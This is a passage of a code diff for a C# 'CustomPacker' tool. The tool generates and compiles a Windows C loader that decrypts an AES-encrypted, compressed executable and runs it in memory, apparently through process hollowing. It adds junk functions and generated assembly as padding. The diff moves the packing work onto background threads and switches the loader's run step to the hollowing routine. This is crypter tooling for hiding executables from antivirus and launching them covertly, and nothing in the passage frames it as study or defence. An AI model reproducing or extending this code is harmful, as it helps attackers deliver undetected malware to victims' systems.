+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
     return 1;
 }
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
     (void)h; (void)p; (void)cmd; (void)show;
-
-    /* Touch all junk — forces linker to include them */
-    volatile unsigned int  _dc = {{fnJunk}}(GetCurrentProcessId());  (void)_dc;
-    volatile unsigned long long _d1 = {{fnAsm1}}(); (void)_d1;
-    volatile unsigned long long _d2 = {{fnAsm2}}(); (void)_d2;
-    volatile unsigned long long _d3 = {{fnAsm3}}(); (void)_d3;
-
-    unsigned int plainLen = 0;
-    unsigned char* compressed = {{fnAes}}(g_enc, g_enc_len, &plainLen);
+    volatile unsigned int  _dc={{fnJunk}}(GetCurrentProcessId()); (void)_dc;
+    volatile unsigned long long _d1={{fnAsm1}}(); (void)_d1;
+    volatile unsigned long long _d2={{fnAsm2}}(); (void)_d2;
+    volatile unsigned long long _d3={{fnAsm3}}(); (void)_d3;
+    unsigned int plainLen=0;
+    unsigned char* compressed={{fnAes}}(g_enc,g_enc_len,&plainLen);
     if (!compressed) return 1;
-
-    unsigned char* pe = {{fnDcmp}}(compressed, (SIZE_T)g_cmp_size, (SIZE_T)g_org_size);
-    VirtualFree(compressed, 0, MEM_RELEASE);
-    if (!pe) return 1;
-
-    {{fnRun}}(pe, g_org_size);
-
-    VirtualFree(pe, 0, MEM_RELEASE);
+    unsigned char* stub_pe={{fnDcmp}}(compressed,(SIZE_T)plainLen,(SIZE_T)g_org_size);
+    VirtualFree(compressed,0,MEM_RELEASE);
+    if (!stub_pe) return 1;
+    {{fnHol}}(stub_pe,g_org_size);
+    VirtualFree(stub_pe,0,MEM_RELEASE);
     return 0;
 }
 """;
@@ -511,15 +657,22 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
         byte[] raw = await File.ReadAllBytesAsync(exePath);
         log($"[*] CustomPacker: Input {raw.Length / 1024:N0} KB");
 
-        byte[] compressed = Compress(raw, log);
-        var (cipher, key, iv) = EncryptAes(compressed);
+        var uiCtx = SynchronizationContext.Current;
+        Action<string> uiLog = uiCtx is null ? log : msg => uiCtx.Post(_ => log(msg), null);
+
+        var (compressed, cipher, key, iv) = await Task.Run(() =>
+        {
+            var c = Compress(raw, uiLog);
+            var (ci, k, i) = EncryptAes(c);
+            return (c, ci, k, i);
+        });
         log($"[*] CustomPacker: AES-256-CBC encrypted ({cipher.Length / 1024:N0} KB)");
 
         var (asmSrc, fn1, fn2, fn3) = GenerateAsmJunk();
         string loaderSrc = GenerateLoaderSource(cipher, key, iv,
             (uint)compressed.Length, (uint)raw.Length, fn1, fn2, fn3);
 
-        string? clPath = FindClExe(log);
+        string? clPath = await Task.Run(() => FindClExe(log));
         if (clPath == null) { log("[!] CustomPacker: cl.exe not found — skipped."); return; }
 
         var ml64Path = Path.Combine(Path.GetDirectoryName(clPath)!, "ml64.exe");
@@ -529,7 +682,7 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {
             return;
         }
 
-        var vsEnv  = GetVsEnvironment(clPath);
+        var vsEnv = await Task.Run(() => GetVsEnvironment(clPath));
         var tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
         Directory.CreateDirectory(tempDir);
         try
